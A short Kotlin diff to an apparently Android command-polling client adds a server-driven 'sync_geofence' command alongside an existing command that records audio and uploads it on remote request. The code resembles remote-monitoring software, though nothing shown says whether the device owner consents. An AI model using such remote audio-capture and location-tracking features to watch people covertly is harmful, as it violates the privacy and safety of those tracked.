@@ -127,6 +127,23 @@ class CommandPoller(
                 val success = AudioRecorderHelper.recordAndUpload(context, client, prefs)
                 if (success) "ok" else "failed"
             }
+            "sync_geofence" -> {
+                val geofenceData = client.getGeofence(prefs.deviceId)
+                if (geofenceData != null) {
+                    val enabled = geofenceData.optBoolean("enabled", false)
+                    if (enabled) {
+                        val lat = geofenceData.optDouble("lat", 0.0)
+                        val lng = geofenceData.optDouble("lng", 0.0)
+                        val radius = geofenceData.optDouble("radius", 100.0).toFloat()
+                        GeofenceHelper.addGeofence(context, lat, lng, radius)
+                    } else {
+                        GeofenceHelper.removeGeofence(context)
+                    }
+                    "ok"
+                } else {
+                    "failed"
+                }
+            }
             else -> "unknown_command"
         }
     }
